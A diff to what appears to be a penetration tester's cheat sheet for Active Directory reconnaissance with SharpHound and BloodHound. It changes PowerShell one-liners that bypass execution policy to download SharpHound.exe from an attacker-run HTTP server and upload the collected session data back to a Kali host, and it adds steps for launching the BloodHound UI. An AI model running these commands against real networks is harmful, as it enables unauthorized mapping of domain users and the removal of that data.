@@ -40,7 +40,7 @@ python -m SimpleHTTPServer
 
 - Windows
 cd to a discrete, writable directory (C:\Users\<user>\Desktop)
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.0.6:8000/SharpHound.exe', 'SharpHound.exe')"
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/SharpHound.exe', 'SharpHound.exe')"
 
 SharpHound.exe -c LoggedOn                 Run the following as a user that has admin rights
 SharpHound.exe -c Session                  On subseqequent runs just collect session data
@@ -48,9 +48,12 @@ SharpHound.exe -c Session                  On subseqequent runs just collect ses
 This will generate a zip file
 
 Upload the zip file to Kali
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.0.6/sharp.zip',"<PostDATA>")"
+powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/sharp.zip',"<PostDATA>")"
 
-Open the BloodHound UI
+- BloodHound UI
+cd /opt/BloodHound-3/BloodHound-linux-x64/
+./BloodHound --no-sandbox
+Login
 Drag and drop the zip file into the UI
 ------------------------------------------------------------------------------------------------------
 
